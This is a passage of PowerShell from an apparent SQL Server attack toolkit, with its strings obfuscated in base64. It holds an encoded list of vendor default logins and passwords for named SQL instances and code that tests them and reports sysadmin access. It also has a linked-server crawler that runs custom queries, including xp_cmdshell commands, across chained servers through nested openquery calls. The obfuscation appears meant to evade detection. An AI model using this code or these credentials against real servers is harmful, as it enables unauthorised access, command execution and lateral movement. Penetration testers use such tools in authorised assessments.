        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBQAEEAUwBFAFIAVgBFAFIAOQA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBNAGEAdABlAEIAUABBADkA')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBEAFIARABJAEMATwBNAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBEAFIARABpAGMAbwBtADUAMAAhAA==')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBPAEQARQBQAEEATAA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAGQAMwBwAEAAbAA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBPAEQARQBQAEEATAAwADgA'))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAGQAMwBwAEAAbAA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbgB0AGUAcgBQAG8AaQBuAHQA'))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbgB0AGUAcgBQAG8AaQBuAHQAOAA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBTAFMAUQBMADAANQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBMAE4AQQBkAG0AaQBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBMAE4AQQBkAG0AaQBuAA==')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBTAFMAUQBMADAANQA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG0AYgByAGkAZABnAGUAUwBvAGYAdABfAFMAQQA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBBAEQAUwBRAEwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBBAEQAUwBRAEwAQQBkAG0AaQBuAFUAcwBlAHIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByADQAMQBnADEAcwB0AGgAMwBNADQAbgAhAA==')))) | Out-Null  
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABIAEwARQBBAFMAWQBTAEgASQBQAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABIAEwAYQBkAG0AaQBuAEAAMQA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABQAE0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBhAF8AYQBkAG0AaQBuAA==')))) | out-null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABWAFQARQBMAA=='))),"sa","") | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBBAFMAWQBTAEgASQBQAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABIAEwAYQBkAG0AaQBuAEAAMQA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBDAEMA'))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBlAGIAZwBpAGwAaQB0AHkAMgAwADEAMQA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBDAE8AUABZAEQAQgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQArAEMAMABwAHkAMgAwADAANwBfAEAAeAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQArAEMAMABwAHkAMgAwADAANwBfAEAAeAA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBDAE8AUABZAEQAQgA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBjAG8AcAB5AA==')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBtAGUAcgBzAG8AbgAyADAAMQAyAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAyAEUAbQBlAHIAcwBvAG4ANAAyAEUAbQBlAA==')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABEAFAAUwA='))),"sa","sa") | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABQAEQAUwBTAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABwAGQAcwBkAGIAMAAwADAAMAAwADEA')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABQAEQAUwBTAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABwAGQAcwBzAA==')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBOAFMARQBSAFQARwBUAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGkA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHkAYgBvAGEANQA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBOAFMARQBSAFQARwBUAA=='))),"sa","") | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBOAFQAUgBBAFYARQBUAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBlAGIAcwB0AGUAcgAjADEA')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBZAE0ATwBWAEkARQBTAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAA5AEEAcgBhAG4AdQBIAEEANwA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABDAEEATQBFAFIASQBDAEEA'))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABjAEEAbQBlAHIAMQBjAGEA')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABDAEEATQBFAFIASQBDAEEA'))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABDAEEAbQBlAHIAaQBjAGEA')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAEkAUwBNAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAHQAZQByADAAOAA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBNAFMAUQBMAEQAQQBUAEEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AHAAZQByAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwByAGEAbgBnAGUA')))) | out-null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAEMATABPAEMAQQBMAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQB5AHAAYQBzAHMAdwBvAHIAZAA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBCAEEAVAA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MwA0AFQASgA0AEAAIwAkAA==')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBJAFQA'))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MwA0AFQASgA0AEAAIwAkAA==')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBDAE8A'))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MwA0AFQASgA0AEAAIwAkAA==')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAEQAQgBFAEEATQA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MwA0AFQASgA0AEAAIwAkAA==')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBBAEwARQBTAEwATwBHAEkAWAA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBMAFgATQBhAHMAdABlAHIA')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQARQBYAEkAUwBfAFMAUQBMAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgBCAGUAQwBoAGEAbgBnAGUAZAA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAMgBLADUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwB2AHMAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwB2AHMAZAA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwARQBYAFAAUgBFAFMAUwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBhAF8AYQBkAG0AaQBuAA==')))) | out-null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwARQBYAFAAUgBFAFMAUwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBjAHMAXwBjAGwAaQBlAG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMARwBhAGwALgA1ADUANgAwAA==')))) | Out-Null     
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwARQBYAFAAUgBFAFMAUwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBjAHMAXwB3AGUAYgBfAGMAbABpAGUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMARwBhAGwALgA1ADUANgAwAA==')))) | out-null 
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwARQBYAFAAUgBFAFMAUwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBCAE4AVQBzAGUAcgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBCAE4AUABhAHMAcwB3AG8AcgBkAA==')))) | out-null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBUAEEATgBEAEEAUgBEAEQARQBWADIAMAAxADQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAHMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAHMAdAA=')))) | Out-Null 
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABFAFcAXwBTAFEATABFAFgAUABSAEUAUwBTAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAHcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAHcA')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dgBvAGMAbwBsAGwAZQBjAHQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dgBvAGMAbwBsAGwAZQBjAHQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dgBvAGMAbwBsAGwAZQBjAHQA')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBTAEQATwBUAE4ARQBUAA=='))),"sa","") | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBTAFEATAA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADEA')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBBAFMARQBXAEkAUwBFAA=='))),"sa","") | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBBAE4AVABBAEcARQA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dgBhAG4AdABhAGcAZQAxADIAIQA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBDAE0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBjAG0AZABiAHUAcwBlAHIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBjAG0AdQBzAGUAcgBAADAANgA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBDAE0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBjAG0AZABiAHUAcwBlAHIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYQByAGEAQAAwADYA')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABFAFgASQBTAF8ARABBAFQAQQA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAHgAaQBzAA==')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABFAFgASQBTAF8ARABBAFQAQQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAHgAaQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAHgAaQBzAA==')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAFQASwBJAE4ARwBEAE8ATQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAFQASwBJAE4ARwBEAE8ATQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABlAGkAJABtAGkAYwBNAGkAYwByAG8A')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFADcAXwBNAFMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AHAAZQByAHYAaQBzAG8AcgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AHAAZQByAHYAaQBzAG8AcgA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFADcAXwBNAFMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAA==')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBIAEQA'))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBoAGQAdQBzAGEAQAAxADIAMwA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBQAEMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAHIAdgBpAGMAZQBhAGQAbQBpAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAC4AMAA=')))) | Out-Null           
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAHIAcwBoAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAGwAbwBjAGkAdAB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQA1AFgAOQBGAEcANAAyAA==')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAHIAcwBoAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQA1AFgAOQBGAEcANAAyAA==')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBQAFMAUQBMAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAHQAZQByADAAOAA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBBAFIARQBXAEEAUgBFAA=='))),"sa",'') | Out-Null        
        $PwCount = $DefaultPasswords | measure | select count -ExpandProperty count
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TargetInstance = $Instance.Split("\")[1]
        if(-not $TargetInstance){
            Write-Verbose "$Instance : No named instance found."
            return
        }
        $TblResultsTemp = ""
        $TblResultsTemp = $DefaultPasswords | ? { $_.instance -eq "$TargetInstance"}        
        if($TblResultsTemp){    
            Write-Verbose "$Instance : Confirmed instance match." 
        }else{
            Write-Verbose "$Instance : No instance match found."
            return 
        }        
        $CurrentUsername = $TblResultsTemp.username
        $CurrentPassword = $TblResultsTemp.password
        $LoginTest = Get-SQLServerInfo -Instance $instance -Username $CurrentUsername -Password $CurrentPassword -SuppressVerbose
        if($LoginTest){
            Write-Verbose "$Instance : Confirmed default credentials - $CurrentUsername/$CurrentPassword"
            $SysadminStatus = $LoginTest | select IsSysadmin -ExpandProperty IsSysadmin
            $TblResults.Rows.Add(
                $ComputerName,
                $Instance,
                $CurrentUsername,
                $CurrentPassword,
                $SysadminStatus
            ) | Out-Null
        }else{
            Write-Verbose "$Instance : No credential matches were found."
        }
    }
    End
    {
        $TblResults
    }
}
Function Get-SQLServerLinkCrawl{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,
        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,
        [Parameter(Mandatory=$false,
        HelpMessage="Dedicated Administrator Connection (DAC).")]
        [Switch]$DAC,
        [Parameter(Mandatory=$false,
        HelpMessage="Connection timeout.")]
        [int]$TimeOut = 2,
        [Parameter(Mandatory=$false,
        HelpMessage="Custom SQL query to run on each server.")]
        [string]$Query,
        [Parameter(Mandatory=$false,
        HelpMessage="Convert collected data to exportable format.")]
        [switch]$Export
    )
    Begin
    {   
        $List = @()
        $Server = New-Object PSObject -Property @{ Instance=""; Version=""; Links=@(); Path=@(); User=""; Sysadmin=""; CustomQuery=""}
        $List += $Server
        $SqlInfoTable = New-Object System.Data.DataTable
    }
    Process
    {
        $i=1
        while($i){
            $i--
            foreach($Server in $List){
                if($Server.Instance -eq "") {
                    $List = (Get-SQLServerLinkData -list $List -server $Server -query $Query)
                    $i++
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAA==')))
                    Write-Verbose " Server: $($Server.Instance)"
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAA==')))
                    Write-Verbose " - Link Path to server: $($Server.Path -join $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtAD4AIAA='))))"                    
                    Write-Verbose " - Link Login: $($Server.User)"                                   
                    Write-Verbose " - Link IsSysAdmin: $($Server.Sysadmin)"
                    Write-Verbose " - Link Count: $($Server.Links.Count)"                    
                    Write-Verbose " - Links on this server: $($Server.Links -join ', ')"
                }   
            } 
        }
        if($Export){
            $LinkList = New-Object System.Data.Datatable
            [void]$LinkList.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
            [void]$LinkList.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))))
            [void]$LinkList.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))))
            [void]$LinkList.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABpAG4AawBzAA=='))))
            [void]$LinkList.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))))
            [void]$LinkList.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAYQBkAG0AaQBuAA=='))))
            [void]$LinkList.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwB1AHMAdABvAG0AUQB1AGUAcgB5AA=='))))
            foreach($Server in $List){
                [void]$LinkList.Rows.Add($Server.instance,$Server.version,$Server.path -join $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtAD4AIAA='))), $Server.links -join ",", $Server.user, $Server.Sysadmin, $Server.CustomQuery -join ",")
            }
            return $LinkList
        } else {
            return $List
        }
    }
    End
    {
    }
}
Function Get-SQLServerLinkData{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true,
        HelpMessage="Return the server objects identified during the server link crawl.  Link crawling is done via theGet-SQLServerLinkCrawl function.")]
        $List,
        [Parameter(Mandatory=$true,
        HelpMessage="Server object to be tested")]
        $Server,
        [Parameter(Mandatory=$false,
        HelpMessage="Custom SQL query to run")]
        $Query
    )
    Begin
    {
        $SqlInfoQuery = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGwAZQBjAHQAIABAAEAAcwBlAHIAdgBlAHIAbgBhAG0AZQAgAGEAcwAgAHMAZQByAHYAZQByAG4AYQBtAGUALAAgAEAAQAB2AGUAcgBzAGkAbwBuACAAYQBzACAAdgBlAHIAcwBpAG8AbgAsACAAcwB5AHMAdABlAG0AXwB1AHMAZQByACAAYQBzACAAbABpAG4AawB1AHMAZQByACwAIABpAHMAXwBzAHIAdgByAG8AbABlAG0AZQBtAGIAZQByACgAJwBzAHkAcwBhAGQAbQBpAG4AJwApACAAYQBzACAAcgBvAGwAZQA=')))
        $SqlLinksQuery = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGwAZQBjAHQAIABzAHIAdgBuAGEAbQBlACAAZgByAG8AbQAgAG0AYQBzAHQAZQByAC4ALgBzAHkAcwBzAGUAcgB2AGUAcgBzACAAdwBoAGUAcgBlACAAZABhAHQAYQBhAGMAYwBlAHMAcwA9ADEA')))
    }
    Process
    {
        $SqlInfoTable = Get-SqlQuery -instance $Instance -Query ((Get-SQLServerLinkQuery -path $Server.Path -sql $SqlInfoQuery)) -Timeout $Timeout -Username $UserName -Password $Password -Credential $Credential
        if($SqlInfoTable.Servername -ne $null){
            $Server.Instance = $SqlInfoTable.Servername
            $Server.Version = [System.String]::Join("",(($SqlInfoTable.Version)[10..25]))
            $Server.Sysadmin = $sqlInfoTable.role
            $Server.User = $sqlInfoTable.linkuser
            if($List.Count -eq 1) { $Server.Path += ,$sqlInfoTable.servername }
            $SqlInfoTable = Get-SqlQuery -instance $Instance -Query ((Get-SQLServerLinkQuery -path $Server.Path -sql $SqlLinksQuery)) -Timeout $Timeout -Username $UserName -Password $Password -Credential $Credential
            $Server.Links = [array]$SqlInfoTable.srvname
            if($Query -ne ""){
                if($Query -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgB4AHAAXwBjAG0AZABzAGgAZQBsAGwAKgA=')))){
                    $Query =  $Query + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABXAEkAVABIACAAUgBFAFMAVQBMAFQAIABTAEUAVABTACAAKAAoAG8AdQB0AHAAdQB0ACAAVgBBAFIAQwBIAEEAUgAoADgAMAAwADAAKQApACkA')))
                }
                if($Query -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgB4AHAAXwBkAGkAcgB0AHIAZQBlACoA')))){
                    $Query = $Query + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFcASQBUAEgAIABSAEUAUwBVAEwAVAAgAFMARQBUAFMAIAAoACgAbwB1AHQAcAB1AHQAIABWAEEAUgBDAEgAQQBSACgAOAAwADAAMAApACwAIABkAGUAcAB0AGgAIABpAG4AdAApACkA')))
                }
                $SqlInfoTable = Get-SqlQuery -instance $Instance -Query ((Get-SQLServerLinkQuery -path $Server.Path -sql $Query)) -Timeout $Timeout -Username $UserName -Password $Password -Credential $Credential
                if($Query -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBXAEkAVABIACAAUgBFAFMAVQBMAFQAIABTAEUAVABTACoA')))){
                    $Server.CustomQuery = $SqlInfoTable.output
                } else {
                    $Server.CustomQuery = $SqlInfoTable
                }
            }
            if(($Server.Path | sort | gu).Count -eq ($Server.Path).Count){
                foreach($Link in $Server.Links){
                    $Linkpath = $Server.Path + $Link
                    $List += ,(New-Object PSObject -Property @{ Instance=""; Version=""; Links=@(); Path=$Linkpath; User=""; Sysadmin=""; CustomQuery="" })
                }
            }
        } else {
            $Server.Instance = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgByAG8AawBlAG4AIABMAGkAbgBrAA==')))
        }
        return $List
    }
}
Function Get-SQLServerLinkQuery{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL link path to crawl. This is used by Get-SQLServerLinkCrawl.")]
        $Path=@(),
        [Parameter(Mandatory=$false,
        HelpMessage="SQL query to build the crawl path around")]
        $Sql, 
        [Parameter(Mandatory=$false,
        HelpMessage="Counter to determine how many single quotes needed")]
        $Ticks=0
    )
    if ($Path.length -le 1){
        return($Sql -replace "'", ("'"*[Math]::pow(2,$Ticks)))
    } else {
        return($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGwAZQBjAHQAIAAqACAAZgByAG8AbQAgAG8AcABlAG4AcQB1AGUAcgB5ACgAIgA=')))+$Path[1]+"`","+"'"*[Math]::pow(2,$Ticks)+
        (Get-SQLServerLinkQuery -path $Path[1..($Path.Length-1)] -sql $Sql -ticks ($Ticks+1))+"'"*[Math]::pow(2,$Ticks)+")")
    }
}
function Get-DomainSpn
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$DomainController,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name to filter for.')]
        [string]$ComputerName,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain account to filter for.')]
        [string]$DomainAccount,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SPN service code.')]
        [string]$SpnService,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $SuppressVerbose)
        {
